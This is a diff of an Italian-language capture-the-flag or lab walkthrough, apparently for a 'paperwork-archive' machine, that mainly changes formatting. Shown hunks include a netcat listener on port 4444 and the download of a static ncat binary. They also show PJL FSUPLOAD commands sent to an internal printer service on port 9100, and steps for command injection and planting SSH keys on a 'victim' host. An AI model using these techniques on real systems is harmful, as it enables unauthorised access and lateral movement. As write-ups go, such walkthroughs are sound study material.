@@ -32,7 +32,7 @@ ispezionando il codice dell'archivio scaricato `paperwork-archive-v1.02` o scope
 
 ```python
 
-\#!/usr/bin/env python3
+#!/usr/bin/env python3
 
 import socket
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -60,6 +60,7 @@ s.send(b'\x00') # Byte finale di chiusura sessione
 print("Risposta Finale:", s.recv(1024))
 s.close()
 ```
+
 ```lua
 
 	nc -lvnp 4444
@@ -68,6 +69,7 @@ s.close()
 	
 	lp 
 ```
+
 #lateral moviment
 + ispezionando il systema `which nc`,mi sono accorto che non era installato di defaul il che la cosa mi e parsa strana, allora o scaricato un ncat statico su (https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/ncat)
 + dopo aver inspezionato la porta interna >*127.0.0.1:9100 con `./ncat 127.0.0.1 9100 ` o trovato un servizio che mi a permesso di eseguire un comando;
@@ -76,7 +78,7 @@ s.close()
 	printf "\x1b%%-12345X@PJL FSUPLOAD NAME=\"jetdirect.py\"\n\x1b%%-12345X\n" | ./ncat 127.0.0.1 9100
 ```
 
-```js 
+```python 
 jetdirect.py
 @PJL FSUPLOAD NAME="jetdirect.py" SIZE=5119
 
@@ -238,10 +240,9 @@ if __name__ == "__main__":
 ```
 
 #### moviment lateral user archivist
-- [x] dopo l'ispezione del codice trovato o notato che vi era una possibile `comand injection`
-allora o preparato delle chiavi `ssh`;
+- [x] dopo l'ispezione del codice trovato o notato che vi era una possibile `comand` injection, ho preparato delle chiavi `ssh`;
 
-```bash
+```js
 	ssh-keygen -t rsa -f /tmp/id_rsa (dalla mia kali)
 	
 	python3 -m http.server 8000
@@ -252,8 +253,9 @@ allora o preparato delle chiavi `ssh`;
         | ./ncat 127.0.0.1 9100
 	
 ```
+
 ### connessione alla macchina victima tramite ssh ed il file creato:
-dopo aver generato e trasferito la chiave pubblica `id_rsa.pub` nella macchina vittima con il seguente comando;
+- [x] dopo aver generato e trasferito la chiave pubblica `id_rsa.pub` nella macchina vittima con il seguente comando;
 
 ```bash
 	cat id_rsa.pub | xclip -sel clip (apt install xclip, se non e nel vostro systema)
